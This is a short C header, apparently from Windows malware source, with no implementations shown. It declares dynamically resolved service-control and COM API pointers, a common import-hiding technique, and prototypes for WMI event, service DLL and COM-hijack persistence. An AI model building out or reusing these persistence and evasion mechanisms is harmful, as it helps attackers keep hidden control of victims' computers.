// persistence.h

#pragma once

#include <windows.h>

// API function pointers for dynamic resolution
typedef SC_HANDLE(WINAPI *pOpenSCManagerA)(LPCSTR, LPCSTR, DWORD);
typedef SC_HANDLE(WINAPI *pCreateServiceA)(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD);
typedef BOOL(WINAPI *pCloseServiceHandle)(SC_HANDLE);
typedef BOOL(WINAPI *pDeleteService)(SC_HANDLE);
typedef SC_HANDLE(WINAPI *pOpenServiceA)(SC_HANDLE, LPCSTR, DWORD);
typedef BOOL(WINAPI *pStartServiceA)(SC_HANDLE, DWORD, LPCSTR*);
typedef BOOL(WINAPI *pChangeServiceConfig2A)(SC_HANDLE, DWORD, LPVOID);
typedef HRESULT(WINAPI *pCoInitializeEx)(LPVOID, DWORD);
typedef HRESULT(WINAPI *pCoCreateInstance)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
typedef VOID(WINAPI *pCoUninitialize)(VOID);

// Function Prototypes
BOOL SetupWMIEventPersistence();
BOOL SetupServiceDLLPersistence();
BOOL SetupCOMHijack();
